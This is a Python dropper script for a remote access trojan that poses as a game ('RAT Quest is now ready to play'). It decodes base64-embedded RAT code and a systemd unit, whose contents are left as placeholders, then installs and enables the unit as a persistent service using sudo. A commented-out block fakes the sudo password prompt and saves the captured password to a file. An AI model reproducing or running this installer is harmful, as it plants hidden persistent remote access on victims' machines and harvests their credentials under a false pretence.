
import base64
import os
import subprocess
import getpass
from os.path import exists

name = subprocess.check_output(['whoami'], shell=False).decode('utf-8').strip().replace("\n", "")
sudo_password = ""


# while(True):

#     sudo_password = getpass.getpass(f"[sudo] password for {name}: ")
    
#     process = subprocess.Popen(['sudo','-S', '-v'], stderr=subprocess.PIPE, stdout=subprocess.PIPE,  stdin=subprocess.PIPE)  

#     try:      
#         err, out = process.communicate(input=(f"{sudo_password}\r\n").encode(), timeout=5)
        
#         result = str(out.decode('utf-8')).strip()

#         if result == "":
#             try:
#                 with open(f"/home/{name}/rat.config/sudo.txt", "w") as f:
#                     f.writelines(sudo_password)
#             except BaseException as based:
#                 print(based)
#             break
#         else:
#            print("Sorry, try again.")
#            continue 

#     except subprocess.TimeoutExpired:
#         process.kill()
#         print("Sorry, try again.")
#         continue

if not exists(f"/home/{name}/"):
    os.system(f"sudo mkdir /home/{name}/")

os.system(f"sudo mkdir /home/{name}/rat.config/")

rat_pog = "<REPLACE_WITH_RAT_BASE64>"

decodedBytes = base64.b64decode(rat_pog)
decodedStr = decodedBytes.decode("utf-8")

with open("RAT.py", "w", encoding='utf-8') as f:
    data = f.writelines(str(decodedStr))

os.system(f'echo "{sudo_password}" | sudo -S mv RAT.py /home/{name}/rat.config/RAT.py')

rat_pog_service = "<REPLACE_WITH_RAT_SERVICE_BASE64>"

decodedBytes = base64.b64decode(rat_pog_service)
decodedStr = decodedBytes.decode("utf-8")

with open("rat.service", "w", encoding='utf-8') as f:
    data = f.writelines(str(decodedStr).replace("<username>", name))

os.system(f'echo "{sudo_password}" | sudo -S mv rat.service /etc/systemd/system/rat.service')

os.system(f'echo "{sudo_password}" | sudo -S systemctl daemon-reload')
os.system(f'echo "{sudo_password}" | sudo -S systemctl enable rat.service')
os.system(f'echo "{sudo_password}" | sudo -S systemctl start rat.service')


print("RAT Quest is now ready to play 🐀")
